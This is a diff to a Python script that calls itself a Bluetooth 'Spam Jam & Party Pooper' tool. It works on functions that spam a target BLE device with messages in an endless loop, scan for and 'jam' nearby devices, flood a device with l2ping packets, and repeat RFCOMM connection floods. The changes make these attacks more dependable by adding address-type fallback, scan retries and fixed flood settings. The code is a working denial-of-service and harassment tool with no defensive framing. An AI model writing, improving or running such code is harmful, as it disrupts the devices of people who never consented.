@@ -3,7 +3,7 @@ import sys
 import time
 import random
 import subprocess
-from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_RANDOM, BTLEException
+from bluepy.btle import Scanner, Peripheral, DefaultDelegate, ADDR_TYPE_RANDOM, ADDR_TYPE_PUBLIC, BTLEException
 
 # 🎨 Spam Jam & Party Pooper Banner
 def print_banner():
@@ -28,27 +28,44 @@ class BLESpam(DefaultDelegate):
     def handleNotification(self, cHandle, data):
         print(f"🔔 Notification from BLE device: {data}")
 
-# 🚀 BLE Spamming with User Input!
+# 🚀 BLE Spamming with Smart Address Type Detection!
 def spam_ble():
     target_mac = input("💜 Enter target BLE MAC address: ")
     print(f"🚀 Spamming device {target_mac} 💥💜")
     custom_message = input("💜 Enter your custom spam message: ").encode()
 
     try:
+        print("🔎 Attempting connection with RANDOM address type...")
         peripheral = Peripheral(target_mac, ADDR_TYPE_RANDOM)
-        peripheral.setDelegate(BLESpam())
-        while True:
+    except BTLEException:
+        print("⚠️ RANDOM address type failed! Trying PUBLIC address type...")
+        try:
+            peripheral = Peripheral(target_mac, ADDR_TYPE_PUBLIC)
+        except BTLEException as e:
+            print(f"❌ Failed to connect to {target_mac}. Error: {e}")
+            return
+
+    peripheral.setDelegate(BLESpam())
+    while True:
+        try:
             peripheral.writeCharacteristic(0x0001, custom_message)
             print(f"💜 Spammed: {custom_message.decode(errors='ignore')}")
             time.sleep(0.5)
-    except Exception as e:
-        print(f"⚠️ Error: {e}")
+        except Exception as e:
+            print(f"⚠️ Error: {e}")
+            break
 
-# 🎯 BLE Jamming Function
+# 🎯 BLE Jamming Function (Now Handles Scan Errors!)
 def jam_ble():
     print("🔎 Scanning for BLE devices to jam 📡")
     scanner = Scanner()
-    devices = scanner.scan(10.0)
+    
+    try:
+        devices = scanner.scan(10.0)
+    except BTLEException as e:
+        print(f"⚠️ BLE Scan Failed! Retrying... Error: {e}")
+        time.sleep(2)
+        return jam_ble()
 
     if not devices:
         print("⚠️ No BLE devices found. Try again!")
@@ -75,14 +92,7 @@ def jam_ble():
     except BTLEException as e:
         print(f"⚠️ Failed to jam {target_device}: {e}")
 
-# 🦠 Party Pooper Features 🦠
-def start_bluetooth():
-    """Start the Bluetooth service if not running."""
-    print("📡 Starting Bluetooth service...")
-    subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
-    print("✅ Bluetooth service started!")
-
-# 🔎 Bluetooth Device Scanner (FIXED!)
+# 🔎 Bluetooth Device Scanner (Fixed!)
 def scan_bluetooth():
     print("🔎 Scanning for Bluetooth devices... (This may take a few seconds)\n")
     
@@ -110,27 +120,8 @@ def l2ping_attack():
         print("⚠️  L2Ping requires root privileges! Try running: sudo python3 spam_jam.py")
         return
 
-    packet_size = input("💜 Enter packet size (default 600, max 672): ") or "600"
-
-    try:
-        packet_size = int(packet_size)
-        if packet_size > 672:
-            print("⚠️ Packet size too large! Setting to max allowed: 672 bytes.")
-            packet_size = 672  
-    except ValueError:
-        print("⚠️ Invalid input! Using default size: 600 bytes.")
-        packet_size = 600  
-
-    attack_mode = input("💜 Flood mode? (y/n): ").lower() == "y"
-
-    if attack_mode:
-        print(f"💥 Flooding {addr} with {packet_size}-byte L2Ping packets!")
-        subprocess.run(['l2ping', '-i', 'hci0', '-s', str(packet_size), '-f', addr], check=True)
-    else:
-        print(f"💥 Sending single {packet_size}-byte L2Ping packet to {addr}")
-        subprocess.run(['l2ping', '-i', 'hci0', '-s', str(packet_size), addr], check=True)
-
-    print("✅ L2Ping attack complete!")
+    print(f"💥 Sending L2Ping flood to {addr}")
+    subprocess.run(['l2ping', '-c', '100', '-s', '600', addr], check=True)
 
 # ✅ RFCOMM FLOOD FUNCTION!
 def rfcomm_flood():
@@ -140,31 +131,20 @@ def rfcomm_flood():
         print("⚠️ No address entered. Exiting RFCOMM flood.")
         return
 
-    try:
-        duration = int(input("💜 Enter flood duration in seconds (default 30): ") or "30")
-    except ValueError:
-        print("⚠️ Invalid input! Using default duration of 30 seconds.")
-        duration = 30  
+    print(f"💥 Starting RFCOMM connection flood on {addr}...")
 
-    print(f"💥 Starting RFCOMM connection flood on {addr} for {duration} seconds...")
-
-    start_time = time.time()
-    attempt = 0
-
-    while time.time() - start_time < duration:
+    for i in range(1000):
         try:
-            attempt += 1
-            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True, timeout=10)  
-            print(f"✅ Attempt {attempt}: Connected to {addr}")
-        except subprocess.TimeoutExpired:
-            print(f"⚠️ Attempt {attempt}: Connection timed out to {addr}, skipping...")
+            subprocess.run(['rfcomm', 'connect', addr, '1'], check=True)
+            print(f"✅ Attempt {i+1}: Connected to {addr}")
         except subprocess.CalledProcessError:
-            print(f"⚠️ Attempt {attempt}: Connection failed to {addr}")
-        except KeyboardInterrupt:
-            print("⚠️ Stopped by user. Exiting RFCOMM flood.")
-            break
+            print(f"⚠️ Attempt {i+1}: Connection failed to {addr}")
 
-    print("✅ RFCOMM flood completed!")
+# 🦠 Start Bluetooth Service
+def start_bluetooth():
+    print("📡 Starting Bluetooth service...")
+    subprocess.run(['sudo', 'service', 'bluetooth', 'start'], check=True)
+    print("✅ Bluetooth service started!")
 
 # 🏁 Main Function
 def main():
@@ -186,6 +166,8 @@ def main():
             sys.exit()
         elif choice in "123456":
             functions[int(choice)-1]()
+        else:
+            print("⚠️ Invalid choice. Try again! 💜")
 
 if __name__ == "__main__":
     main()
